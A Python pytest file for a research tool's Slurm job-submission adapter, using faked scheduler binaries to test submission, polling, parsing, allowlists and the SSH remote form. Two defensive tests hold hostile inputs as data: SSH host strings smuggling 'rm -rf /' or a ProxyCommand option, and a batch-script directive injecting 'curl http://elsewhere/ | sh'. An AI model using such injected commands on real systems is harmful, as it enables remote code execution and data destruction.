"""The Slurm abstraction, on a machine that has no Slurm.

That is the normal case for a laptop, and it is the case this file is mostly
about: the adapter must report ``UNAVAILABLE`` honestly rather than pretending a
job was queued, and everything above it must still be exercisable. So the
scheduler binaries are faked -- real executables on a temporary PATH, producing
the byte-for-byte output ``sbatch``, ``squeue``, and ``scancel`` actually produce
-- while the parsing, the state mapping, the script generation, and the
lifecycle are all the production code.

What the tests hold the adapter to:

* a job's state comes from the scheduler, and an unrecognised state is UNKNOWN
  rather than rounded to "failed";
* a partition outside the researcher's allowlist is refused;
* nothing is built as a shell string, and the remote form is ``ssh <alias> ...``
  with no credential, option, or user in it;
* a machine with no scheduler says so.
"""

from __future__ import annotations

import os
import stat
import subprocess
from pathlib import Path

import pytest

from research_os.errors import (
    ExperimentAuthorizationError,
    ExperimentConfigError,
    SchedulerUnavailableError,
)
from research_os.experiment.config import (
    ExecutionLimits,
    ExperimentConfig,
    ProjectExperiments,
    SlurmSettings,
)
from research_os.experiment.controller import ExperimentBudget, ExperimentController
from research_os.experiment.models import ExecutionState, ExecutorKind
from research_os.experiment.slurm import (
    SlurmExecutor,
    map_state,
    parse_sacct,
    probe,
)
from research_os.experiment.spec import CommandSpec, resolve_command
from research_os.experiment.store import ExperimentStore

PROJECT_ID = "widget-study"


@pytest.fixture
def research_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    root = tmp_path / "xdg"
    for name, subdirectory in (
        ("RESEARCH_OS_CONFIG_HOME", "config"),
        ("RESEARCH_OS_DATA_HOME", "data"),
        ("RESEARCH_OS_CACHE_HOME", "cache"),
        ("RESEARCH_OS_STATE_HOME", "state"),
    ):
        path = root / subdirectory
        path.mkdir(parents=True)
        monkeypatch.setenv(name, str(path))
    return root / "state"


def fake_binary(directory: Path, name: str, body: str) -> Path:
    """Install a real executable that produces the output Slurm would."""

    directory.mkdir(parents=True, exist_ok=True)
    target = directory / name
    target.write_text(f"#!/bin/sh\n{body}\n", encoding="utf-8")
    target.chmod(target.stat().st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    return target


@pytest.fixture
def fake_slurm(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Put a working, entirely local Slurm on PATH."""

    binaries = tmp_path / "fake-slurm"
    fake_binary(binaries, "sbatch", 'echo "204815;cluster"')
    fake_binary(binaries, "squeue", "exit 1")
    fake_binary(
        binaries,
        "sacct",
        'printf "204815|COMPLETED|0:0|00:02:31|00:04:02|" ; printf "|1|sched_sloan\\n"'
        ' ; printf "204815.batch|COMPLETED|0:0|00:02:31|00:04:02|1048576K|1|\\n"',
    )
    fake_binary(binaries, "scancel", "exit 0")
    monkeypatch.setenv("PATH", f"{binaries}{os.pathsep}{os.environ['PATH']}")
    return binaries


def slurm_settings(**overrides: object) -> SlurmSettings:
    payload: dict[str, object] = {
        "enabled": True,
        "partitions": ["sched_sloan", "mit_normal"],
        "default_time_limit": "00:30:00",
    }
    payload.update(overrides)
    return SlurmSettings.model_validate(payload)


def cluster_command() -> CommandSpec:
    return CommandSpec.model_validate(
        {
            "name": "fit-model",
            "argv": ["python3", "fit.py", "--seed", "{seed}"],
            "parameters": [
                {"name": "seed", "type": "integer", "required": True, "minimum": 0}
            ],
            "outputs": ["results/fit.json"],
            "checks": ["outputs_exist"],
            "timeout_seconds": 1800,
            "executor": "slurm",
        }
    )


def cluster_config(
    *, settings: SlurmSettings | None = None, limits: ExecutionLimits | None = None
) -> ExperimentConfig:
    spec = cluster_command()
    return ExperimentConfig(
        slurm=settings or slurm_settings(),
        limits=limits or ExecutionLimits(),
        projects={PROJECT_ID: ProjectExperiments(commands={spec.name: spec})},
        source=None,
    )


def _git_only_path(tmp_path: Path) -> Path:
    """Return a PATH directory holding git and nothing else."""

    import shutil as _shutil

    directory = tmp_path / "git-only-path"
    directory.mkdir(exist_ok=True)
    real_git = _shutil.which("git")
    assert real_git is not None
    link = directory / "git"
    if not link.exists():
        link.symlink_to(real_git)
    return directory


def git_project(path: Path) -> Path:
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q", "--initial-branch=main"], cwd=path, check=True)
    subprocess.run(
        ["git", "config", "user.email", "tests@example.invalid"], cwd=path, check=True
    )
    subprocess.run(["git", "config", "user.name", "tests"], cwd=path, check=True)
    (path / "fit.py").write_text("print('x')\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=path, check=True)
    subprocess.run(["git", "commit", "-qm", "initial"], cwd=path, check=True)
    return path


# -- this machine has no scheduler --------------------------------------------


def test_a_machine_with_no_scheduler_says_so_rather_than_pretending(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("PATH", str(_git_only_path(tmp_path)))

    found = probe(slurm_settings())

    assert found.available is False
    assert set(found.missing) == {"sbatch", "squeue", "sacct"}
    assert "not a Slurm submit host" in found.detail


def test_slurm_that_is_not_enabled_is_unavailable_and_says_why() -> None:
    found = probe(SlurmSettings())

    assert found.available is False
    assert "not enabled" in found.detail


def test_submitting_from_a_machine_with_no_scheduler_is_refused(
    research_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A PATH with git and nothing else: the point of this test is the
    # scheduler's absence, and removing git too would test the wrong thing.
    project = git_project(tmp_path / "project")
    monkeypatch.setenv("PATH", str(_git_only_path(tmp_path)))
    controller = ExperimentController(config=cluster_config())

    with pytest.raises(SchedulerUnavailableError, match="not a Slurm submit host"):
        controller.run(
            project_path=project,
            task_name="fit-model",
            worktree=project,
            parameters={"seed": 7},
            project_id=PROJECT_ID,
            execute=True,
        )


# -- with a scheduler ---------------------------------------------------------


def test_a_job_is_submitted_and_the_scheduler_id_is_recorded(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())

    store, run, packet = controller.run(
        project_path=project,
        task_name="fit-model",
        worktree=project,
        parameters={"seed": 7},
        project_id=PROJECT_ID,
        execute=True,
    )

    assert run.state is ExecutionState.SUBMITTED
    assert run.executor is ExecutorKind.SLURM
    assert run.scheduler is not None
    assert run.scheduler.job_id == "204815"
    assert run.scheduler.partition == "sched_sloan", "the first listed is the default"
    assert packet is None, "a queued job has produced no results to read"
    assert store.script_file.is_file()


def test_the_generated_script_carries_only_validated_settings(
    fake_slurm: Path, tmp_path: Path
) -> None:
    executor = SlurmExecutor(settings=slurm_settings(account="sloan-acct"))
    command = resolve_command(cluster_command(), {"seed": 7})

    script = executor.build_script(
        command,
        job_name="research-os-fit-model",
        partition="sched_sloan",
        working_directory=str(tmp_path),
        time_limit="00:30:00",
        stdout_path="/tmp/out",
        stderr_path="/tmp/err",
    )

    assert "#SBATCH --partition=sched_sloan" in script
    assert "#SBATCH --time=00:30:00" in script
    assert "#SBATCH --account=sloan-acct" in script
    assert "python3 fit.py --seed 7" in script
    assert "set -euo pipefail" in script


def test_a_partition_outside_the_allowlist_is_refused(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())

    with pytest.raises(ExperimentAuthorizationError, match="not in this project"):
        controller.run(
            project_path=project,
            task_name="fit-model",
            worktree=project,
            parameters={"seed": 7},
            project_id=PROJECT_ID,
            execute=True,
            partition="somebody-elses-queue",
        )


def test_the_first_listed_partition_is_the_default(fake_slurm: Path) -> None:
    """Preferring Sloan over mit_normal is expressed by listing it first."""

    settings = slurm_settings(partitions=["sched_sloan", "mit_normal"])

    assert settings.default_partition == "sched_sloan"
    assert settings.allows("mit_normal")
    assert not settings.allows("gpu_unlimited")


def test_no_partition_configured_is_a_configuration_error(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(
        config=cluster_config(settings=slurm_settings(partitions=[]))
    )

    with pytest.raises(
        ExperimentConfigError, match="No Slurm partition|no Slurm partition"
    ):
        controller.run(
            project_path=project,
            task_name="fit-model",
            worktree=project,
            parameters={"seed": 7},
            project_id=PROJECT_ID,
            execute=True,
        )


def test_a_run_that_has_spent_its_submission_budget_is_refused(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(
        config=cluster_config(limits=ExecutionLimits(max_submissions_per_run=2)),
        budget=ExperimentBudget(submissions=2),
    )

    with pytest.raises(ExperimentAuthorizationError, match="already submitted"):
        controller.run(
            project_path=project,
            task_name="fit-model",
            worktree=project,
            parameters={"seed": 7},
            project_id=PROJECT_ID,
            execute=True,
        )


def test_polling_reads_the_scheduler_s_own_answer(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())
    store, run, _ = controller.run(
        project_path=project,
        task_name="fit-model",
        worktree=project,
        parameters={"seed": 7},
        project_id=PROJECT_ID,
        execute=True,
    )

    polled = controller.poll(store)

    assert polled.state is ExecutionState.COMPLETED
    assert polled.scheduler is not None
    assert polled.scheduler.raw_state == "COMPLETED"
    assert polled.scheduler.exit_code == 0
    assert polled.usage.wall_clock_seconds == pytest.approx(151.0)
    assert polled.usage.max_rss_kb == 1048576
    assert polled.usage.observed_by == "sacct"
    assert ExperimentStore.open(run.run_id).load().state is ExecutionState.COMPLETED


def test_a_live_job_is_reported_from_squeue(
    research_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    binaries = tmp_path / "fake-slurm-running"
    fake_binary(binaries, "sbatch", 'echo "99;cluster"')
    fake_binary(binaries, "squeue", 'echo "RUNNING|None"')
    fake_binary(binaries, "sacct", "exit 1")
    monkeypatch.setenv("PATH", f"{binaries}{os.pathsep}{os.environ['PATH']}")
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())
    store, _, _ = controller.run(
        project_path=project,
        task_name="fit-model",
        worktree=project,
        parameters={"seed": 7},
        project_id=PROJECT_ID,
        execute=True,
    )

    polled = controller.poll(store)

    assert polled.state is ExecutionState.RUNNING
    assert polled.ended_at is None


def test_a_job_neither_command_knows_is_unknown_rather_than_failed(
    research_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Calling a lost job "failed" would misreport it."""

    binaries = tmp_path / "fake-slurm-silent"
    fake_binary(binaries, "sbatch", 'echo "1000;cluster"')
    fake_binary(binaries, "squeue", "exit 1")
    fake_binary(binaries, "sacct", "exit 1")
    monkeypatch.setenv("PATH", f"{binaries}{os.pathsep}{os.environ['PATH']}")
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())
    store, _, _ = controller.run(
        project_path=project,
        task_name="fit-model",
        worktree=project,
        parameters={"seed": 7},
        project_id=PROJECT_ID,
        execute=True,
    )

    polled = controller.poll(store)

    assert polled.state is ExecutionState.UNKNOWN
    assert polled.scheduler is not None
    assert "aged out" in polled.scheduler.reason


def test_a_refused_submission_is_an_error_not_a_silent_success(
    research_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    binaries = tmp_path / "fake-slurm-refuses"
    fake_binary(binaries, "sbatch", 'echo "sbatch: error: invalid account" >&2; exit 1')
    fake_binary(binaries, "squeue", "exit 1")
    fake_binary(binaries, "sacct", "exit 1")
    monkeypatch.setenv("PATH", f"{binaries}{os.pathsep}{os.environ['PATH']}")
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())

    with pytest.raises(SchedulerUnavailableError, match="invalid account"):
        controller.run(
            project_path=project,
            task_name="fit-model",
            worktree=project,
            parameters={"seed": 7},
            project_id=PROJECT_ID,
            execute=True,
        )


def test_cancelling_records_the_cancellation(
    research_home: Path, fake_slurm: Path, tmp_path: Path
) -> None:
    project = git_project(tmp_path / "project")
    controller = ExperimentController(config=cluster_config())
    store, _, _ = controller.run(
        project_path=project,
        task_name="fit-model",
        worktree=project,
        parameters={"seed": 7},
        project_id=PROJECT_ID,
        execute=True,
    )

    cancelled = controller.cancel(store)

    assert cancelled.state is ExecutionState.CANCELLED
    assert "cancelled by the researcher" in (cancelled.failure_reason or "")


# -- the remote form ----------------------------------------------------------


def test_a_remote_cluster_is_reached_as_ssh_alias_and_nothing_else() -> None:
    """Research OS names a host; the researcher's own SSH config does the rest."""

    executor = SlurmExecutor(settings=slurm_settings(ssh_host="cluster-login"))

    argv = executor.argv_for(["squeue", "--job", "1"])

    assert argv == ["ssh", "cluster-login", "squeue", "--job", "1"]
    assert not any(item.startswith("-o") for item in argv)
    assert not any("@" in item for item in argv)
    assert not any("identity" in item.lower() for item in argv)


def test_an_ssh_host_that_is_not_a_plain_alias_is_refused() -> None:
    for hostile in (
        "user@host",
        "host -o StrictHostKeyChecking=no",
        "host;rm -rf /",
        "-oProxyCommand=evil",
    ):
        with pytest.raises(ValueError, match="plain SSH destination alias"):
            SlurmSettings(enabled=True, ssh_host=hostile)


def test_a_remote_probe_reports_the_alias_and_that_ssh_is_what_it_needs() -> None:
    found = probe(slurm_settings(ssh_host="cluster-login"))

    assert found.kind is ExecutorKind.SLURM_SSH
    assert found.ssh_host == "cluster-login"
    assert "ssh cluster-login" in found.detail


# -- parsing ------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("PENDING", ExecutionState.PENDING),
        ("RUNNING", ExecutionState.RUNNING),
        ("COMPLETED", ExecutionState.COMPLETED),
        ("FAILED", ExecutionState.FAILED),
        ("TIMEOUT", ExecutionState.TIMED_OUT),
        ("CANCELLED by 1234", ExecutionState.CANCELLED),
        ("OUT_OF_MEMORY", ExecutionState.FAILED),
        ("SOMETHING_NEW", ExecutionState.UNKNOWN),
        ("", ExecutionState.UNKNOWN),
    ],
)
def test_scheduler_states_map_or_stay_unknown(
    raw: str, expected: ExecutionState
) -> None:
    assert map_state(raw) is expected


def test_sacct_output_is_read_for_state_exit_code_and_resources() -> None:
    output = (
        "204815|FAILED|2:0|01:02:03|00:30:00||2|sched_sloan\n"
        "204815.batch|FAILED|2:0|01:02:03|00:30:00|2097152K|1|\n"
    )

    state, record, usage = parse_sacct(output, "204815")

    assert state is ExecutionState.FAILED
    assert record.exit_code == 2
    assert record.partition == "sched_sloan"
    assert usage.wall_clock_seconds == pytest.approx(3723.0)
    assert usage.cpu_seconds == pytest.approx(1800.0)
    assert usage.max_rss_kb == 2097152
    assert usage.node_count == 2


def test_a_job_killed_by_a_signal_records_the_signal() -> None:
    state, record, _ = parse_sacct("7|FAILED|0:9|00:00:05|00:00:01||1|p\n", "7")

    assert state is ExecutionState.FAILED
    assert record.signal == 9


def test_day_spanning_elapsed_times_parse() -> None:
    _, _, usage = parse_sacct("7|COMPLETED|0:0|2-03:04:05|00:00:01||1|p\n", "7")

    assert usage.wall_clock_seconds == pytest.approx(2 * 86400 + 3 * 3600 + 4 * 60 + 5)


def test_an_unparseable_elapsed_time_is_unknown_rather_than_zero() -> None:
    _, _, usage = parse_sacct("7|COMPLETED|0:0|not-a-time|x||1|p\n", "7")

    assert usage.wall_clock_seconds is None
    assert usage.cpu_seconds is None


# -- what may reach a generated batch script ----------------------------------
def test_a_scheduler_directive_cannot_carry_a_newline_into_the_script(
    tmp_path: Path,
) -> None:
    """The one place a model-chosen string met something a shell interprets.

    `#SBATCH --gres=<value>` is a bash comment -- right up until the value
    contains a newline, at which point everything after it is script body
    that Slurm runs under `set -euo pipefail`. Every other model-chosen
    string in that script goes through `shlex.quote`; the directives did
    not. A security review of this branch found it, and found that
    `resources` reaches the objective cycle as `{str(k): str(v)}` over a
    raw provider dict with no contract at all.

    Latent, because the portfolio hard-codes the local executor and Slurm
    is enabled on no host this has run on. It is still the only place
    `SECURITY.md`'s "nothing here interpolates into a shell" was untrue.
    """

    from research_os.runtime.executors import ExecutorError, SlurmExecutor
    from research_os.runtime.interfaces import ExecutionSpec

    executor = SlurmExecutor()
    hostile = ExecutionSpec(
        name="fit",
        argv=("true",),
        cwd=str(tmp_path),
        env={},
        outputs=(),
        timeout_seconds=60,
        resources={"gres": "gpu:1\ncurl http://elsewhere/ | sh"},
    )
    with pytest.raises(ExecutorError, match="not a plain directive value"):
        executor.build_script(hostile, run_dir=tmp_path, job_name="j")


def test_ordinary_scheduler_directives_still_render(tmp_path: Path) -> None:
    """Positive control: the real forms a researcher writes are accepted."""

    from research_os.runtime.executors import SlurmExecutor
    from research_os.runtime.interfaces import ExecutionSpec

    spec = ExecutionSpec(
        name="fit",
        argv=("true",),
        cwd=str(tmp_path),
        env={},
        outputs=(),
        timeout_seconds=60,
        resources={
            "partition": "gpu-normal",
            "time_limit": "01:00:00",
            "memory": "16G",
            "gres": "gpu:a100:2",
        },
    )
    script = SlurmExecutor().build_script(spec, run_dir=tmp_path, job_name="j")
    assert "#SBATCH --gres=gpu:a100:2" in script
    assert "#SBATCH --time=01:00:00" in script
    assert "#SBATCH --mem=16G" in script
